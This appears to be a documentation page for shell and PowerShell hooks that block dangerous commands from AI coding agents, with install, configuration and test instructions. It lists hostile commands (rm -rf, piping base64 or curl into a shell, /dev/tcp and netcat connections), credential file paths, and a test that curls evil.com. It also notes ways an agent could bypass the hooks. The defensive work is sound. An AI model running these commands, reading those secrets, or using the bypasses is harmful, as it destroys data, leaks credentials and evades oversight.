---
layout: page
title: "Security Hooks for Agentic Harness"
permalink: /hooks-for-harness/
---

# Security Hooks for Agentic Harness

PreToolUse security hooks that enforce deterministic security controls for agentic CLI workflows. Each hook intercepts a tool call before execution and blocks dangerous operations.

## Security Coverage

### 1. Destructive Commands
- `rm -rf`, `rm -fr`, `rm` with wildcards or absolute paths
- Path evasion attempts (`/bin/rm -rf`, `/usr/bin/rm -rf`)
- Disk operations: `mkfs`, `dd`, `fdisk`, `parted`, `shred`
- Windows: `Remove-Item -Recurse -Force`, `Format-Volume`, `Clear-Disk`, `diskpart`

### 2. Encoding & Obfuscation Bypasses
- Base64/hex decoding to shell: `base64 -d | bash`, `xxd -r | sh`
- `eval` command (arbitrary code execution)
- `source` and dot sourcing (`. /script.sh`)
- PowerShell: `Invoke-Expression`, `iex`, `[Convert]::FromBase64String`

### 3. Indirect Execution
- Script execution: `bash script.sh`, `sh script.sh`, `zsh script.sh`
- One-liners: `perl -e`, `python -c`, `ruby -e`, `node -e`, `php -r`
- Command chaining: `find -exec`, `xargs sh`
- PowerShell: `-File`, `Start-Process powershell`

### 4. Environment Manipulation
- PATH hijacking: `export PATH=/evil:$PATH`
- Library injection: `LD_PRELOAD`, `LD_LIBRARY_PATH`
- PowerShell: `$env:PATH` modification

### 5. Network Bypass Techniques
- Bash TCP/UDP: `/dev/tcp/`, `/dev/udp/`
- Raw sockets: `nc`, `netcat`, `ncat`, `socat`, `telnet`
- File descriptor redirection: `exec 3<>/dev/tcp/...`
- PowerShell: `System.Net.Sockets`

### 6. Sensitive File Protection
| Category | Files Protected |
|----------|-----------------|
| SSH | `~/.ssh/id_*`, `~/.ssh/config`, `~/.ssh/authorized_keys` |
| Cloud | `~/.aws/credentials`, `~/.azure/`, `~/.gcp/`, `~/.kube/config` |
| Apps | `.env`, `.npmrc`, `.pypirc`, `.netrc`, `.docker/config.json` |
| Git | `.git/config`, `.gitconfig`, `.git-credentials` |
| System | `/etc/shadow`, `/etc/passwd`, `/etc/sudoers` |
| Certs | `*.pem`, `*.key`, `*.crt`, `*.p12`, `*.pfx` |

### 7. Credential Leakage Prevention
- Inline credentials: `api_key=xxx`, `token=xxx`, `password=xxx`
- Credential flags: `curl -u user:pass`, `wget --password`
- Secret echoing: `echo $AWS_SECRET_ACCESS_KEY`, `echo $GITHUB_TOKEN`
- Environment listing: `env`, `printenv`, `set`, `export`

### 8. Self-Protection
- Blocks modification of `.github/hooks/` directory
- Blocks access to `security-check.sh`, `security-check.ps1`
- Blocks modification of `security-hooks.json`

### 9. Package Manager Blocking
| Ecosystem | Blocked Commands |
|-----------|------------------|
| Node.js | `npm install/i/ci/add`, `npx`, `yarn add`, `pnpm add`, `bun install`, `bunx` |
| Python | `pip install`, `pip3 install`, `pipx`, `uv add`, `conda install`, `mamba` |
| Ruby | `gem install`, `bundle install` |
| Go | `go install`, `go get` |
| Rust | `cargo install`, `cargo add` |
| PHP | `composer install/require/update` |
| .NET | `dotnet add package`, `nuget install`, `Install-Package` |
| System | `apt`, `yum`, `dnf`, `pacman`, `brew`, `apk`, `snap`, `flatpak` |
| Windows | `choco install`, `winget install`, `scoop install` |

### 10. Remote Script Execution
- Unix: `curl | sh`, `wget | bash`, `curl | sudo`
- PowerShell: `IWR | IEX`, `Invoke-RestMethod | Invoke-Expression`

### 11. Domain Allowlist
Network access is restricted to explicitly allowed domains. Default allowlist:
- GitHub: `github.com`, `api.github.com`, `raw.githubusercontent.com`, `gist.githubusercontent.com`
- CDNs: `cdn.jsdelivr.net`, `cdnjs.cloudflare.com`, `unpkg.com`
- Docs: `docs.github.com`, `stackoverflow.com`

---

## Installation

### For a Repository (Coding Agent)

```bash
# Copy hooks to your repository
cp -r .github/hooks/ /path/to/your/repo/.github/hooks/

# Commit and merge to default branch
git add .github/hooks/
git commit -m "Add Copilot security hooks"
git push
```

### For Local CLI Usage

```bash
# Copy to your project directory
cp -r .github/hooks/ /path/to/project/.github/hooks/

# Hooks load automatically when running copilot from that directory
```

---

## Configuration

### Adding Allowed Domains

Edit `security-check.sh` (bash) or `security-check.ps1` (PowerShell):

```bash
# Bash
ALLOWED_DOMAINS+=(
    "internal.yourcompany.com"
    "api.yourcompany.com"
)
```

```powershell
# PowerShell
$AllowedDomains += @(
    "internal.yourcompany.com"
    "api.yourcompany.com"
)
```

### Adding Custom Blocked Patterns

```bash
# Block specific commands
BLOCKED_COMMAND_PATTERNS+=(
    '\bchmod\s+.*\.ssh/'           # SSH key modifications
    '\baws\s+s3\s+rm'              # AWS S3 deletions
)
```

---

## Testing

```bash
# Safe command (should pass)
echo '{"toolName":"bash","toolArgs":{"command":"ls -la"}}' | ./.github/hooks/security-check.sh
# → {"approve": true}

# Dangerous command (should block)
echo '{"toolName":"bash","toolArgs":{"command":"rm -rf /"}}' | ./.github/hooks/security-check.sh
# → {"approve": false, "message": "BLOCKED: Dangerous command..."}

# Allowed domain (should pass)
echo '{"toolName":"bash","toolArgs":{"command":"curl https://api.github.com/users"}}' | ./.github/hooks/security-check.sh
# → {"approve": true}

# Non-allowed domain (should block)
echo '{"toolName":"bash","toolArgs":{"command":"curl https://evil.com/malware"}}' | ./.github/hooks/security-check.sh
# → {"approve": false, "message": "BLOCKED: Network access to non-allowed domain..."}

# Package install (should block)
echo '{"toolName":"bash","toolArgs":{"command":"npm install lodash"}}' | ./.github/hooks/security-check.sh
# → {"approve": false, "message": "BLOCKED: Dangerous command pattern..."}
```

---

## File Structure

```
.github/
└── hooks/
    ├── security-hooks.json      # Hook configuration
    ├── security-check.sh        # Bash (Linux/macOS)
    └── security-check.ps1       # PowerShell (Windows)
```

---

## Requirements

| Platform | Requirement |
|----------|-------------|
| Linux/macOS | `jq` for JSON parsing |
| Windows | PowerShell 5.1+ (built-in `ConvertFrom-Json`) |

Install jq:
```bash
# Ubuntu/Debian
apt-get install jq

# macOS
brew install jq

# RHEL/Fedora
dnf install jq
```

---

## Performance

| Metric | Typical | Worst Case |
|--------|---------|------------|
| Per-check latency | 50-100ms | 100-250ms |
| Session overhead (100 calls) | 5-10s | 10-25s |
| Comparison to LLM latency | <5% | <10% |

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Hook not running | Ensure `.github/hooks/` is in repo root and merged to default branch |
| Permission denied | Run `chmod +x scripts/security-check.sh` |
| Invalid JSON | Install `jq` or check script syntax |
| False positives | Adjust regex patterns to be more specific |
| jq not found | Install jq for your platform |

---

## Security Notes

- Hooks run with user permissions. They prevent accidents, not malicious users with shell access.
- Review hook configurations before deploying.
- Log blocked commands for audit.
- Update the allowed domains list as your requirements change.
- These hooks are one layer of defence, not the whole security model.

---

## Known Limitations

1. Multi-stage encoding chains (e.g. base64 inside hex inside a variable) can bypass pattern matching.
2. Symlink races between check and execution (TOCTOU). Low risk in a CLI context.
3. Malicious instructions in CLAUDE.md could attempt to work around hooks.
4. Written files aren't scanned for malicious content.
